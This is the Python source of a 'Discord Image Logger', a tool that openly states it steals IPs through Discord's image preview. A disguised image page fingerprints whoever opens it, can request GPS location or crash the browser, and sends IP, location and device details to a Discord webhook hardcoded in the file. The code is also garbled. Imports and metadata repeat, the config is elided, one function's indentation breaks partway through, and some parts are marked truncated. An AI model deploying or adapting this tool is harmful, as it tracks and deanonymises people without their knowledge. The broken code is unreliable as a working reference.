# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1366729762218709072/_eER0Pvy1eQ3BkgjHH3KwPoxDsJRIdSz6zp9sS7bm5JiyE3Vmi8EfIV6fZP6UwSDWJeZ",
    "image": "https://upload.wikimedia.org/wikipedia/commons/c/c7/Tabby_cat_with_blue_eyes-3336579.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, datetime

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # ... (keep your existing config) ...
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, fingerprint=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    # Default values for undefined variables
    username = "Unknown"
    gmail = "Unknown"
    password = "Unknown"
    address = "Unknown"
    phone = "Unknown"
    device_info = "Unknown"
    CPU = fingerprint.get('hardwareConcurrency', 'Unknown') if fingerprint else 'Unknown'
    RAM = fingerprint.get('deviceMemory', 'Unknown') if fingerprint else 'Unknown'
    GPU = "Unknown"  # FingerprintJS doesn't provide GPU info
    ScreenResolution = fingerprint.get('screenResolution', 'Unknown') if fingerprint else 'Unknown'
    SystemArchitecture = "Unknown"  # Not available in browser
    JavaScriptEnabled = "True"
    CookiesEnabled = "True"
    Language = fingerprint.get('language', 'Unknown') if fingerprint else 'Unknown'

    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Username:** `{username}`
> **Gmail:** `{gmail}`
> **Password:** `{password}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Address:** `{address}`
> **Phone:** `{phone}`
> **Device:** `{device_info}`
> **Coords:** `{(str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}` ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{'True' if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
> **CPU Cores:** `{CPU}`
> **RAM (GB):** `{RAM}`
> **GPU:** `{GPU}`
> **Screen Resolution:** `{ScreenResolution}`
> **System Architecture:** `{SystemArchitecture}`
> **JavaScript Enabled:** `{JavaScriptEnabled}`
> **Cookies Enabled:** `{CookiesEnabled}`
> **Language/Locale:** `{Language}`
> **Device Fingerprint:** `{fingerprint.get('visitorId', 'Unknown') if fingerprint else 'Unknown'}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}

if url:
    embed["embeds"][0].update({"thumbnail": {"url": url}})
requests.post(config["webhook"], json=embed)
return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!...')  # (truncated for space)
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
        }}
        div.img {{
            background-image: url('{url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
        }}
    </style>
</head>
<body>
    <div class="img"></div>
    <script>
        // FingerprintJS (Browser/Device Fingerprinting)
        const fpPromise = import('https://fpjscdn.net/v3/fYkKrkKh4S70e1OpIFhF')
            .then(FingerprintJS => FingerprintJS.load());

        // Collect fingerprint and send to server
        fpPromise
            .then(fp => fp.get())
            .then(result => {{
                const visitorId = result.visitorId;
                const deviceData = {{
                    visitorId: visitorId,
                    os: result.components.os.value,
                    browser: result.components.browser.value,
                    screenResolution: result.components.screenResolution.value,
                    device: result.components.device.value,
                    timezone: result.components.timezone.value,
                    language: navigator.language,
                    hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                    deviceMemory: navigator.deviceMemory || "Unknown"
                }};
                
                // Send data to your server
                fetch('/log_fingerprint', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json',
                    }},
                    body: JSON.stringify({{
                        ip: '{self.headers.get('x-forwarded-for')}',
                        userAgent: navigator.userAgent,
                        fingerprint: deviceData
                    }})
                }});
            }})
            .catch(error => console.error('Fingerprint error:', error));

        // Geolocation (if enabled in config)
        {'''
        var currenturl = window.location.href;
        if (!currenturl.includes("g=") && navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function (coords) {{
                const newUrl = currenturl.includes("?") 
                    ? currenturl + "&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D")
                    : currenturl + "?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
                location.replace(newUrl);
            }});
        }}
        ''' if config["accurateLocation"] else ''}
    </script>
</body>
</html>
'''.encode()

            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])

                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                return

            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

                # ... (rest of your existing handleRequest code) ...

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error<br>Please check the webhook logs or report the issue.')
            reportError(traceback.format_exc())
        return

    def do_POST(self):
        if self.path == '/log_fingerprint':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                fingerprint_data = json.loads(post_data.decode('utf-8'))
                
                # Save fingerprint data to a file
                with open('fingerprints.log', 'a') as f:
                    f.write(f"{datetime.datetime.now().isoformat()} - {fingerprint_data}\n")
                
                # Update report with fingerprint data
                makeReport(
                    ip=fingerprint_data.get('ip'),
                    useragent=fingerprint_data.get('userAgent'),
                    endpoint='/log_fingerprint',
                    fingerprint=fingerprint_data.get('fingerprint')
                )
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode())
            
            except Exception as e:
                reportError(f"Fingerprint processing error: {str(e)}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
        else:
            self.handleRequest()

    do_GET = handleRequest

handler = ImageLoggerAPI
